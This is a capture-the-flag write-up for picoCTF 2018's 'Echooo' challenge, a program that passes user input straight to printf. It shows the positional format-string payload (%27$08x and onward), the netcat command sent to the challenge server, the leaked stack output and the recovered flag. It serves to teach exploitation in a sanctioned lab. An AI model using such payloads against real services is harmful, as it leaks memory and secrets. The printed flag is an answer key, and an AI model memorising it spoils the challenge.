# Echooo

This program prints any input you give it. Can you leak the flag? Connect with `nc 2018shell.picoctf.com 46960`.


## Solution
It took me a while to come up with this solution because I was also learning about format string vulnerabilities. I started by using [radare2](https://github.com/radareorg/radare2) in debug mode. I set a breakpoint after the user input and than I printed the stack. It took a bit of trial and error, but eventually I discovered that the flag was stored `27 words (32-bit words)` away. This Medium blog post, [Binary Exploitation: Format String Vulnerabilities](https://medium.com/swlh/binary-exploitation-format-string-vulnerabilities-70edd501c5be) helped me discover that I could get the **ith argument on the stack by using a special case format specifier**.


```
printf("%10$x"); 
-> will print the tenth element next on the stack
```


I used a python one-liner to write the `input.txt` file.

```
python -c 'print(" ".join(["%"+str(i)+"$08x" for i in range(27, 27+16)]))' > input.txt
```

*Note: I manually added newlines in the input file to account for the 63 character buffer size*

```
%27$08x %28$08x %29$08x %30$08x %31$08x %32$08x %33$08x
%34$08x %35$08x %36$08x %37$08x %38$08x %39$08x %40$08x
%41$08x %42$08x
```

Piping this input into netcat results in:

```
$ cat input.txt | nc -w1 2018shell.picoctf.com 46960                                                                
Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
> 6f636970 7b465443 6d526f66 735f7434 6e695274 615f7347 445f6552
> 65476e61 73753072 6237615f 32613463 000a7d64 080487ab 00000001
> ff836014 ff83601c
> $
```
 Using `grep`, `sed`, and `tr` I cleaned up the output so that it could be passed as input to `bytes_to_ascii.py`.


### bytes_to_ascii.py
I wrote this script to transform the output from the stack into readable ascii. This required breaking the `32-bit` words into bytes, reversing the order of the bytes to account for [endianness](https://en.wikipedia.org/wiki/Endianness), and converting the hex to ascii characters.


#### Exploit
Just run the `get_flag.sh` script.

```
$ ./get_flag.sh 
picoCTF{foRm4t_stRinGs_aRe_DanGer0us_a7bc4a2d}
```
